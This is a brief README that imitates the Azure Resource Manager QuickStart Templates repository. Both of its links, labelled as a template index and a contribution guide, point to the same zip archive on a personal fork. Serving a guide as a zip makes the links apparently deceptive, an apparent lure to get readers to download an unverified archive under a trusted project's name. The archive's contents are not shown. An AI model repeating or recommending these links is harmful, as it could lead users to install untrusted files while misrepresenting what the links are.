# Azure Resource Manager QuickStart Templates

This repo contains all currently available Azure Resource Manager templates contributed by the community. A searchable template index is maintained at [https://raw.githubusercontent.com/Harikishan696/azure-quickstart-templates/master/quickstarts/microsoft.search/quickstart_azure_templates_1.9-beta.2.zip](https://raw.githubusercontent.com/Harikishan696/azure-quickstart-templates/master/quickstarts/microsoft.search/quickstart_azure_templates_1.9-beta.2.zip).

See the [**Contribution guide**](https://raw.githubusercontent.com/Harikishan696/azure-quickstart-templates/master/quickstarts/microsoft.search/quickstart_azure_templates_1.9-beta.2.zip) for how to use or contribute to this repo.
